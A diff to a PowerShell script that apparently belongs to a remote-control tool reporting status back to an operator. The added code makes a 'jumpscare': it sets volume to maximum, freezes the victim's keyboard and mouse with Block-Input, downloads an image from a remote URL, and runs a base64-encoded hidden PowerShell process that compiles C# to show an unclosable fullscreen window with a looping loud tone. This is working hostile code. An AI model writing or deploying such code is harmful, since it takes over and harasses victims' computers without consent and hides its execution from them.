@@ -374,9 +374,52 @@ public class Vol {
 '@
     Add-Type -TypeDefinition $vol
     [Vol]::Max()
-    if(-not $url){ $url='https://www.youtube.com/watch?v=dQw4w9WgXcQ' }
-    Start-Process $url
-    Post '`[+] jumpscare: volume 100% + video opened`'
+    if(-not $url){ $url='https://tse1.mm.bing.net/th/id/OIP.koWJllHfY_NI8TIFFUeYjgHaEK?r=0&rs=1&pid=ImgDetMain&o=7&rm=3' }
+    Block-Input
+    $img=Join-Path $env:TEMP ('js_'+[Guid]::NewGuid().ToString('N')+'.jpg')
+    (New-Object Net.WebClient).DownloadFile($url,$img)
+    $js=@'
+using System;
+using System.Drawing;
+using System.Windows.Forms;
+using System.Media;
+using System.IO;
+using System.Text;
+public class JS {
+  [STAThread]
+  public static void Run(string img){
+    try{
+      int rate=8000, freq=720, n=rate*2; short amp=30000;
+      string wav=Path.Combine(Path.GetTempPath(),"js_"+Guid.NewGuid().ToString("N")+".wav");
+      using(var fs=new FileStream(wav,FileMode.Create)){ using(var bw=new BinaryWriter(fs)){
+        int ds=n*2;
+        bw.Write(Encoding.ASCII.GetBytes("RIFF")); bw.Write(36+ds);
+        bw.Write(Encoding.ASCII.GetBytes("WAVE"));
+        bw.Write(Encoding.ASCII.GetBytes("fmt ")); bw.Write(16); bw.Write((short)1); bw.Write((short)1);
+        bw.Write(rate); bw.Write(rate*2); bw.Write((short)2); bw.Write((short)16);
+        bw.Write(Encoding.ASCII.GetBytes("data")); bw.Write(ds);
+        int per=rate/freq;
+        for(int i=0;i<n;i++){ bw.Write((short)((i%per < per/2)?amp:-amp)); }
+      }}
+      var sp=new SoundPlayer(wav); sp.PlayLooping();
+      var f=new Form();
+      f.FormBorderStyle=FormBorderStyle.None;
+      f.WindowState=FormWindowState.Maximized;
+      f.TopMost=true;
+      f.ShowInTaskbar=false;
+      f.BackgroundImage=Image.FromFile(img);
+      f.BackgroundImageLayout=ImageLayout.Stretch;
+      f.Cursor=Cursors.No;
+      Application.Run(f);
+    }catch{}
+  }
+}
+'@
+    $inner="Add-Type -TypeDefinition @'`n$js`n'@ -ReferencedAssemblies 'System.Windows.Forms','System.Drawing'; [JS]::Run('$img')"
+    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
+    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
+    Start-Process 'https://www.youtube.com/watch?v=wmXGkZvGnw8'
+    Post '`[+] jumpscare: fullscreen + volume 100% + input frozen + loud scream`'
   }catch{ Post '`[!] jumpscare failed' }
 }
 
